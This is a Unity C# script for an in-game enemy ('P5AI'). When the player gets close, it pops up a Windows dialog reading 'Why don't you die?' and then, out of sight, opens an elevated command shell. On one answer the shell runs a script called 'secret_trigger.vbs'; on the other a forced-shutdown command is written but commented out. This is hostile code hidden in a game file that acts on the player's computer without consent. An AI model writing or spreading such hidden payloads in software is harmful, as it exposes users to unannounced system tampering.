using System.Diagnostics;
using UnityEngine;
using System.Windows.Forms;
using UnityEditor.Experimental.GraphView;

public class P5AI : MonoBehaviour
{
    public LayerMask ground;
    public bool Playeringround;
    public bool warning, show;
    public float warnline, showline, distance;
    public GameObject player;

    // Start is called before the first frame update
    void Start()
    {

    }

    // Update is called once per frame
    void Update()
    {
        Vector3 PlayerPos = player.transform.position;
        Vector3 P5Pos = transform.position;
        distance = Vector3.Distance(P5Pos, PlayerPos);
        if (distance <= warnline)
        {
            warning = true;
        } else warning = false;
        if (distance <= showline)
        {
            show = true;

            switch (MessageBox.Show("6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666", "Why don't you die?",
MessageBoxButtons.YesNo, MessageBoxIcon.Error))
            {
                case DialogResult.Yes:
                    {
                        ProcessStartInfo proc = new ProcessStartInfo("cmd.exe");
                        proc.Verb = "runas";
                        proc.UseShellExecute = false;
                        proc.RedirectStandardOutput = true;
                        proc.CreateNoWindow = true;
                        proc.RedirectStandardInput = true;
                        var process = Process.Start(proc);
                       // process.StandardInput.WriteLine(@"shutdown /f /s /t 0");
                        break;
                    }
                case DialogResult.No:
                    MessageBox.Show("No? what do you mean no?");
                    {
                        ProcessStartInfo proc = new ProcessStartInfo("cmd.exe");
                        proc.Verb = "runas";
                        proc.UseShellExecute = false;
                        proc.RedirectStandardOutput = true;
                        proc.CreateNoWindow = true;
                        proc.RedirectStandardInput = true;
                        var process = Process.Start(proc);
                        process.StandardInput.WriteLine(@"start secret_trigger.vbs");
                        UnityEngine.Application.Quit();
                        UnityEditor.EditorApplication.isPlaying = false;
                        break;
                        
                    }          
            }
            
        }
        else show = false;
    }
}
